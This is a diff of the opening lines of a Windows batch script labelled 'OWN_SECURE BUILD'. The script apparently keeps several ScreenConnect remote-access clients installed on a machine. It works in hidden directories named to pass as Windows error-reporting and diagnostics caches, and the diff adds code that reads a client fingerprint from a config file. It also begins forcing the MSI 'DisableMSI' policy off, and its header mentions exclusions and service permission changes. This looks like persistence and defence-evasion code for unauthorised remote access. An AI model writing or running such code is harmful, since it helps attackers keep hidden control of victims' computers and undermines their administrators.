@@ -1,22 +1,23 @@
 @echo off
-REM OWN_SECURE BUILD 20260802S8 - gryxa keep; NO LockDir on SC dirs (offline fix); DisableMSI neutralize; exclusions; service SD
+REM OWN_SECURE BUILD 20260802S9 - dynamic gryxa FP from gryxa.cfg; NO LockDir on SC dirs
 setlocal EnableExtensions EnableDelayedExpansion
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
 set "LOG=%WD%\boot.err"
 set "PRIM=ScreenConnect Client (5f6010579852e507)"
 set "ALT=ScreenConnect Client (f861c8140d453427)"
-set "GRYXA=ScreenConnect Client (9908198e668e4750)"
 set "KEEP1=5f6010579852e507"
 set "KEEP2=f861c8140d453427"
 set "KEEP3=9908198e668e4750"
+if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
+set "GRYXA=ScreenConnect Client (%KEEP3%)"
 set "PF=%ProgramFiles%"
 set "PF86=%ProgramFiles(x86)%"
 set "TASKROOT=%SystemRoot%\System32\Tasks"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%WD2%" mkdir "%WD2%" >nul 2>&1
-echo secure_begin %DATE% %TIME% S8>>"%LOG%"
+echo secure_begin %DATE% %TIME% S9>>"%LOG%"
 
 REM --- Neutralize MSI block policies (1625) ---
 REM DisableMSI: 0=allow, 1=non-admin only, 2=all -> force 0
